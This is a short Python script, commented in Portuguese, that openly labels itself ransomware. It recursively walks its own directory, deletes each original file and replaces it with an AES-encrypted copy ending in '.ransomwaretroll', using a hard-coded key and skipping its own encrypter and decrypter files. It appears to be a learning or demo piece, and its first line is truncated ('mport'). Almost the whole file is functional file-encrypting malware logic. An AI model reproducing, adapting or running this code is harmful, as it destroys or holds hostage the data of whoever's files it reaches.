mport os
import pyaes

# Pegar diretório atual
current_directory = os.path.dirname(os.path.abspath(__file__))

# AES
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Excluir arquivos do ransomware
exclude_files = ["encrypter.py", "decrypter.py"]

# Percorrer árvore de diretórios
for root, dirs, files in os.walk(current_directory):
    for file_name in files:
        # Pular arquivos do ransomware
        if file_name in exclude_files:
            continue
        
        file_path = os.path.join(root, file_name)
        
        # Abrir arquivo a ser encriptado
        with open(file_path, "rb") as file:
            file_data = file.read()
        
        # Remover arquivo original
        os.remove(file_path)
        
        # Encriptar arquivo
        crypto_data = aes.encrypt(file_data)
        
        # Salvar arquivo encriptado
        new_file_path = file_path + ".ransomwaretroll"
        with open(new_file_path, "wb") as new_file:
            new_file.write(crypto_data)
